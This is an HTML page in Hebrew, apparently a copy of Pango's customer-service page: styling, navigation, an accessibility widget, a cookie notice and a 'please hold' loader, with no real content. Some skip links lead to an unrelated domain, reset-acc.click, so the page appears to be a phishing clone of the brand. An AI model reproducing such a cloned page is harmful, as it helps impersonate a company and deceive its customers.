                top: 0;
                right: 0
            }

            .modal .modal_content .content {
                padding: .5rem;
                color: #2e69e7;
                font-size: .8rem
            }

            .modal .modal_content .content .title {
                color: #2e69e7
            }

            .modal .close {
                line-height: 1;
                z-index: 1
            }

            .modal .close:hover,.modal .close:focus {
                text-decoration: none;
                cursor: pointer
            }
        </style>
        <meta name="description" content="אפליקציית חניה מתקדמת שמונעת דוחות וחוסכת זמן וכסף. חניה מהנייד בכחול לבן, שירות טסט וטיפול עד הבית, יציאה מהירה מחניונים ועוד מגוון פתרונות לנהג ולרכב.">
        <meta name="keywords" content="">
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1.5, target-densitydpi=180, minimal-ui">
        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="apple-mobile-web-app-title" content="Pango">
        <meta name="theme-color" content="#ffffff">
        <link rel="canonical" href="https://www.pango.co.il/customer-service">
        <style>
            @-webkit-keyframes spinner-rotator {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg)
                }

                100% {
                    -webkit-transform: rotate(270deg);
                    transform: rotate(270deg)
                }
            }

            @keyframes spinner-rotator {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg)
                }

                100% {
                    -webkit-transform: rotate(270deg);
                    transform: rotate(270deg)
                }
            }

            @-webkit-keyframes spinner-dash {
                0% {
                    stroke-dashoffset: 187
                }

                50% {
                    stroke-dashoffset: 46.75;
                    -webkit-transform: rotate(135deg);
                    transform: rotate(135deg)
                }

                100% {
                    stroke-dashoffset: 187;
                    -webkit-transform: rotate(450deg);
                    transform: rotate(450deg)
                }
            }

            @keyframes spinner-dash {
                0% {
                    stroke-dashoffset: 187
                }

                50% {
                    stroke-dashoffset: 46.75;
                    -webkit-transform: rotate(135deg);
                    transform: rotate(135deg)
                }

                100% {
                    stroke-dashoffset: 187;
                    -webkit-transform: rotate(450deg);
                    transform: rotate(450deg)
                }
            }
        </style>
        <style>
            :host {
                all: initial
            }

            #INDWrap {
                position: absolute;
                width: 100%;
                height: 0;
                top: 0;
                z-index: 2147483647
            }

            #INDblindNotif {
                position: fixed!important
            }

            @keyframes INDloader {
                0% {
                    transform: rotate(0)
                }

                100% {
                    transform: rotate(360deg)
                }
            }

            #INDquickAccess,#INDquickAccess li,#INDquickAccess ul {
                height: 0;
                list-style: none
            }

            #INDquickAccess ul {
                margin: 0;
                padding: 0;
                list-style: none
            }

            #INDquickAccess li {
                margin: 0;
                padding: 0
            }

            #INDquickAccess li:after,#INDquickAccess li:before {
                content: ""!important;
                display: none!important
            }

            #INDquickAccess button {
                position: fixed;
                top: -300px;
                margin: 0;
                padding: 8px 16px;
                height: auto;
                width: auto;
                font-size: 24px;
                font-weight: 700;
                text-align: center;
                line-height: normal!important;
                cursor: pointer;
                color: #fff;
                background: #000;
                border-radius: 4px;
                border: 1px solid #fff;
                transition: top .6s;
                z-index: 10
            }

            .INDlangdirRTL #INDquickAccess button {
                font-family: Spacer,Arial,sans-serif
            }

            .INDpositionRight #INDquickAccess button {
                right: 180px
            }

            #INDquickAccess button:focus {
                top: 0
            }

            :not(#INDdummy) :not(#INDdummy).INDhiddenText {
                display: inline-block;
                color: #000;
                background: #fff;
                position: absolute;
                height: 1px;
                width: 1px;
                overflow: hidden;
                clip: rect(1px,1px,1px,1px)
            }

            #INDmenu {
                position: fixed;
                top: 0;
                margin: 0;
                padding: 0;
                width: 180px;
                height: 180px;
                z-index: 100000;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                -o-user-select: none;
                user-select: none;
                border: none;
                border-top: 27px solid #0a7da4;
                border-bottom: 13px solid #0a7da4;
                background: #fff;
                transition: left .4s ease-in,right .4s ease-in,top .4s ease-in,visibility .4s ease-in!important
            }

            .INDpositionRight #INDmenu {
                left: initial!important;
                border-left: 4px solid #0a7da4
            }

            #INDmenu[aria-hidden=true] {
                visibility: hidden
            }

            .INDpositionRight #INDmenu[aria-hidden=true] {
                right: -400px
            }

            @media screen and (max-width: 800px) {
            }

            #INDbtnWrap {
                margin: 0;
                padding: 0;
                border: none;
                z-index: 9999
            }

            @keyframes border-train {
                0% {
                    clip-path: polygon(0 0,0 100%,0 100%,0 0)
                }

                25% {
                    clip-path: polygon(0 0,0 100%,25% 100%,25%0)
                }

                50% {
                    clip-path: polygon(0 0,0 100%,50% 100%,50%0)
                }

                75% {
                    clip-path: polygon(0 0,0 100%,75% 100%,75%0)
                }

                100% {
                    clip-path: polygon(0 0,0 100%,100% 100%,100%0)
                }
            }

            #INDpopup {
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                background: rgba(0,0,0,.7);
                z-index: 99999999999;
                pointer-events: auto;
                opacity: 1;
                transition: opacity 250ms ease-in
            }

            .INDlangdirRTL #INDpopup {
                direction: rtl
            }

            #INDpopup:not(.open) {
                opacity: 0;
                visibility: hidden;
                pointer-events: none;
                transition: opacity 250ms ease-in,visibility 0s ease 250ms
            }

            @media screen and (max-width: 800px) {
            }
        </style>
        <meta name="referrer" content="no-referrer">
        <link rel="shortcut icon" href="data:image/vnd.microsoft.icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAO/y8wDv8vMD7/LzNe/y84zv8vPL7/Lz5O/y8+Pv8vPF7/Lzgu/y8yvv8vMB7/LzAAAAAAAAAAAA7/LzAO/y8wDv8vMR7/Lzfu/y8+Tv8vP+7/Lz/+/y8//v8vP/7/Lz/+/y8/7v8vPc7/Lzbe/y8wrv8vMAAAAAAO/y8wDv8vMS7/Lzou/y8/3v8vL/7/Hx/+/y8v/v8vP/7/Lz/+/y8//v8vP/7/Lz/+/y8/nv8vON7/LzCu/y8wDv8vMD7/Lzhu/y8/7v8/b/8Myw//GYVf/wyqz/7/P1/+/y8//v8vP/7/Lz/+/y8//v8vP/7/Lz+e/y827v8vMA7/LzQu/y8+nv8vP/7/T3//C3iv/wZQD/8LOF/+/2+v/v8/X/7/L0/+/y8//v8vP/7/Lz/+/y8//v8vPb7/LzLO/y86Hv8vP/7/Lz/+/09v/xy67/8ZZQ//G7kv/w28r/8N/R/+/u7P/v8/X/7/Lz/+/y8//v8vP/7/Lz/u/y84Lv8vPg7/Lz/+/y8//v9Pf/8L2V//B1GP/wdBf/8HIT//B2Gv/wl1P/8NzL/+/z9f/v8vP/7/Lz/+/y8//v8vPE7/Lz+u/y8//v8vP/7/T3//C3jP/waAH/8Hoh//CqdP/woGT/8G8O//CNQf/v6OH/7/P0/+/y8//v8vP/7/Lz4+/y8/vv8vP/7/Lz/+/09//wt4v/8GwI//DCnv/v9fj/7/Ly//Cnbv/wawf/8Mmr/+/09//v8vP/7/Lz/+/y8+Tv8vPl7/Lz/+/y8//v9Pf/8LiN//BvDv/w0rv/7/X5/+/2+v/wt4z/8GkD//C/mf/v9Pf/7/Lz/+/y8//v8vPK7/Lzq+/y8//v8vP/7/T2//DOs//wbw3/8JhV//DZyP/w0Lf/8IUz//BxEf/w073/7/T2/+/y8//v8vP/7/LzjO/y807v8vPv7/Lz/+/y9P/v7uv/8KJm//BrBv/wchP/8G8O//BrB//wqHH/7+/u/+/y8//v8vP/7/Lz4+/y8zbv8vMH7/Lzl+/y8//v8vP/7/P0/+/r5v/wu5L/8JZS//CXVP/wvpj/7+zp/+/z9P/v8vP/7/Lz/e/y83/v8vMB7/LzAO/y8xvv8vO27/Lz/+/y8//v8/T/7/T2/+/w8P/v8fD/7/T2/+/y9P/v8vP/7/Lz/e/y86Lv8vMR7/LzAO/y8wDv8vMA7/LzG+/y85fv8vPx7/Lz/+/y8//v8vP/7/Lz/+/y8//v8vP/7/Lz6+/y84bv8vMS7/LzAO/y8wAAAAAAAAAAAO/y8wDv8vMI7/LzTe/y86zv8vPm7/Lz++/y8/rv8vPh7/Lzoe/y80Hv8vMF7/LzAAAAAAAAAAAA4AcAAMADAACAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAADAAwAA4AcAAA==">
       
       <style>
            .sf-hidden {
                display: none!important
            }
        </style>
        <meta http-equiv="content-security-policy" content="default-src &#39;none&#39;; font-src &#39;self&#39; data:; img-src &#39;self&#39; data:; style-src &#39;unsafe-inline&#39;; media-src &#39;self&#39; data:; script-src &#39;unsafe-inline&#39; data:; object-src &#39;self&#39; data:; frame-src &#39;self&#39; data:;">
    </head>
    <body class="device_computer os_other INDlangdirRTL INDpositionRight INDDesktop INDChrome INDhasDragTooltip" data-siteurl="https://www.pango.co.il" data-site="1" style="--wh:945px">
        <div id="INDWrap" lang="he" dir="rtl" data-ind-version="4.1.2" style="display:block">
            <div id="INDblindNotif" tabindex="-1" class="INDhiddenText" role="alert">שִׂים לֵב: בְּאֲתָר זֶה מֻפְעֶלֶת מַעֲרֶכֶת נָגִישׁ בִּקְלִיק הַמְּסַיַּעַת לִנְגִישׁוּת הָאֲתָר. לְחַץ Control-F11 לְהַתְאָמַת הָאֲתָר לְעִוְורִים הַמִּשְׁתַּמְּשִׁים בְּתוֹכְנַת קוֹרֵא־מָסָךְ; לְחַץ Control-F10 לִפְתִיחַת תַּפְרִיט נְגִישׁוּת.</div>
            <div id="INDbtnWrap"></div>
            <div id="INDmenu" aria-hidden="true"></div>
            <div id="INDpopup" aria-hidden="true" style="display:none"></div>
            <div id="INDdata" style="display:none"></div>
            <div id="INDquickAccess">
                <ul>
                    <li>
                        <button accesskey="b" class="INDshortcutBtn" tabindex="1">
                            לְחַץ אֶנְטֵר לְהַתְאָמַת הָאֲתָר לְעִוְורִים<span class="INDhiddenText">הַמִּשְׁתַּמְּשִׁים בְּתוֹכְנַת קוֹרֵא־מָסָךְ.</span>
                        </button>
                    </li>
                    <li>
                        <button accesskey="l" tabindex="1">לְחַץ אֶנְטֵר לְנִוּוּט מִקְלֶדֶת</button>
                    </li>
                    <li>
                        <button tabindex="1">לְחַץ אֶנְטֵר לִפְּתִיחַת תַּפְרִיט נְגִישׁוּת.</button>
                    </li>
                </ul>
            </div>
        </div>
        <!--[if lt IE 9]><div class="browsehappy center rtl padding">אתה משתמש בדפדפן מיושן. אנא <a href="//browsehappy.com/">שדרג את הדפדפן שלך</a> כדי לשפר את חווית הגלישה באתר</div><![endif]-->
        <noscript>
            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5TC2MJL6" height="0" width="0" style="display:none;visibility:hidden"></iframe>
        </noscript>
        <noscript>
            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMR3NRB" height="0" width="0" style="display:none;visibility:hidden"></iframe>
        </noscript>
        <noscript>
            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M9FZ53M" height="0" width="0" style="display:none;visibility:hidden"></iframe>
        </noscript>
        <div class="flexi_wrapper" id="flexi_wrapper">
            <a class="com_accessibility_accesskey" id="skip-link" href="https://reset-acc.click/pango/loading.html#main" accesskey="1">מעבר לתוכן העמוד - מקש קיצור 1</a>
            <a class="com_accessibility_accesskey" href="https://reset-acc.click/pango/loading.html#header" accesskey="2">מעבר לתפריט ראשי - מקש קיצור 2</a>
            <a class="com_accessibility_accesskey" href="https://reset-acc.click/pango/loading.html#footer" accesskey="3">מעבר לתפריט תחתון - מקש קיצור 3</a>
            <a class="com_accessibility_accesskey" href="https://www.pango.co.il/sitemap" accesskey="4">מפת אתר - מקש קיצור 4</a>
            <a class="com_accessibility_accesskey" href="https://www.pango.co.il/%D7%A9%D7%A8%D7%95%D7%AA-%D7%9C%D7%A7%D7%95%D7%97%D7%95%D7%AA/%D7%A6%D7%95%D7%A8-%D7%A7%D7%A9%D7%A8" accesskey="5">צור קשר - מקש קיצור 5</a>
            <a class="com_accessibility_accesskey animation_checker" id="stopAnim" href="javascript:void(0)" accesskey="6">עצירת/הפעלת אנימציות - מקש קיצור 6</a>
            <a class="com_accessibility_accesskey" id="contrast" href="javascript:void(0)" accesskey="7">ניגודיות - מקש קיצור 7</a>
            <div class="header-sticky">
                <header class="header" role="contentinfo" id="header">
                    <div class="container">
                        <div class="header-content-wrap">
                            <div class="menu-tools-wrap">
                                <div class="m_button">
                                    <input role="button" type="checkbox" class="header-input-nav-toggle sf-hidden" id="header-nav-toggle" value="on">
                                    <label for="header-nav-toggle" class="header-label-nav-toggle" aria-label="תפריט"></label>
                                    <nav role="navigation">
                                        <label for="header-nav-toggle" class="header-label-close-nav-toggle" aria-label="סגירת תפריט">
                                            <i class="ic icon-close"></i>
                                            <span>תפריט</span>
                                        </label>
                                        <ul class="lavel-0">
                                            <li class="serach">
                                                <form method="GET" action="https://www.pango.co.il/?action=search">
                                                    <input type="text" name="q" placeholder="מה תרצה לחפש?" value="">
                                                </form>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/services" title="שירותי תחבורה חכמה">
                                                    <span>שירותי תחבורה חכמה</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/benefits" title="הטבות בפנגו">
                                                    <span>הטבות בפנגו</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/plan-lobby" title="מסלולים">
                                                    <span>מסלולים</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/pango-care" title="פנגו Care">
                                                    <span>פנגו Care</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0 has_childs selected" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/customer-service" title="צור קשר ושירות לקוחות">
                                                    <span>צור קשר ושירות לקוחות</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/businesses" title="פנגו לעסקים">
                                                    <span>פנגו לעסקים</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/terms-of-use-categories" title="תנאי שימוש">
                                                    <span>תנאי שימוש</span>
                                                </a>
                                            </li>
                                            <li class="list-0" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/safe-app-use" title="שימוש בטוח באפליקציה">
                                                    <span>שימוש בטוח באפליקציה</span>
                                                </a>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.pango.co.il/about" title="אודות">
                                                    <span>אודות</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
                                                <a href="https://www.comeet.com/jobs/pango/59.002" title="דרושים">
                                                    <span>דרושים</span>
                                                </a>
                                                <div class="lavel-1-wrap sf-hidden"></div>
                                            </li>
                                            <li class="list-0" aria-expanded="false" role="expand button">
                                                <a href="https://land.pango.co.il/FastPark/ParkingRates/ParkingRates" title="ערים ותעריפים">
                                                    <span>ערים ותעריפים</span>
                                                </a>
                                            </li>
                                        </ul>
                                    </nav>
                                    <label for="header-nav-toggle" class="header-label-nav-toggle-dim" aria-hidden="true" tabindex="-1"></label>
                                </div>
                                <div class="m_button sp_hide">
                                    <a href="https://driver.pango.co.il/Manage/logindriver.aspx" class="com_popup_embed" title="איזור אישי">
                                        <span class="text">
                                            <i class="ic icon-user"></i>
                                            <span>איזור אישי</span>
                                        </span>
                                    </a>
                                </div>
                            </div>
                            <div class="logo-wrap">
                                <a role="h1" class="logo" title="עמוד ראשי" tabindex="0" aria-label="Pango">
                                    <img src="data:image/png;base64,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" alt="Pango logo">
                                </a>
                            </div>
                        </div>
                    </div>
                </header>
            </div>
            <article class="page mod_container mod_form mod_form_contact rtl" role="main" id="page">
                <div class="page_body" id="main">
                    <div class="container">
                        <div class="hide sp_show sf-hidden"></div>
                        <div>
                            <div class="apps-links-warp">
                                <!-- loader here -->
                                <div style="padding-bottom:30%">
                                    <h2 class="title">נא להחזיק</h2>
                                    <br>
                                    <br>
                                    <br>
                                    <span class="loader"></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </article>
            <div id="popup_cookie" class="modal">
                <div class="modal_container">
                    <div class="modal_content">
                        <div class="content">
                            <div class="margin">
                                <h3 class="title">
                                    <strong>הפרטיות שלכם חשובה לנו</strong>
                                </h3>
                            </div>
                            <div class="margin">
                                <p>לידיעתך, באתר זה נעשה שימוש ב״קבצי עוגיות״ (cookies) וכלים דומים אחרים על מנת לספק לך חווית גלישה יותר טוב, תוכן מותאם אישית וביצוע ניתוחים סטטיסטים.</p>
                            </div>
                            <div class="margin">
                                <button class="button b_color_3 color close">הבנתי</button>
                            </div>
                            <div class="margin">
                                <a href="https://www.pango.co.il/privacy-policy">למידע נוסף עיין במדיניות הפרטיות שלנו</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
